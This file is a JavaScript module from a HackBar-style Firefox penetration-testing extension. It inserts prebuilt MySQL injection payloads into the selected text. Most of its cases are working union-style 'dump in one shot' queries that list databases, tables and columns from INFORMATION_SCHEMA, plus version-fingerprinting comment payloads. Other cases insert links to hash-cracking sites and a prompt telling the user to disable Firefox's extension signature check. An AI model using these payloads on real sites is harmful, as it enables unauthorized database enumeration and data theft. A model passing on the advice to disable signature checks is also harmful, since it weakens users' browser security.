HackBar.ModVM = {
	
	VariableMethod: function (choice)	{
		var str = choice;
		switch (str){
			case '1': txt = "(SELECT(@y)FROM(SELECT(@y:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.SCHEMATA)WHERE(SCHEMA_NAME!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)AND(0x00)IN(@y:=CONCAT(@y,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,schema_name,0x3c62723e))))y)";
					break;
			case '2': txt = "(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a2920203c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a2920203c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)";
					break;
			case '3': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.tables)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)";
					break;			
			case '4': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.columns)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)";
					break;
			case '5': txt = "(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.tables)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)";
					break;
			case '6': txt = "(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.columns)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)";
					break;
			case '7': txt = "https://github.com/Hack-with-Github/Awesome-Hacking/blob/master/";
					break;
			case '8': txt = "https://brutelogic.com.br/webgun/";
					break;
			case '9': txt = "/*!60000 integer version=6<!*/ /*!50000 integer version=5<!*/ /*!40000 integer version=4<!*/ /*!30000 integer version=3<!*/  ' /*!60000 string version=6<!*/ /*!50000 string version=5<!*/ /*!40000 string version=4<!*/ /*!30000 string version=3<!*/";
					break;
			case '10':
					   var fixfirefox = prompt("[#]======Fixing Firefox Extention Problem======[#]\n1. Load about:config in Firefox's address bar and hit enter\n2. Confirm you will be careful if a warning message is displayed\n3. Search for xpinstall.signatures.required\n4. Double-click on the preference name so that its value is set to false\nFor complete tutorial visit below link","http://hexinjector.cu.ma/fix-firefox-v43-0-verified-extention-problem/");
					   txt = "" + fixfirefox + "";
					break;
			case '11': txt = "https://hashkiller.co.uk/md5-decrypter.aspx";
					break;
			case '12': txt = "https://hashkiller.co.uk/sha1-decrypter.aspx";
					break;
		}	
		hackBar.setSelectedText( txt ); 
	  }
	  
}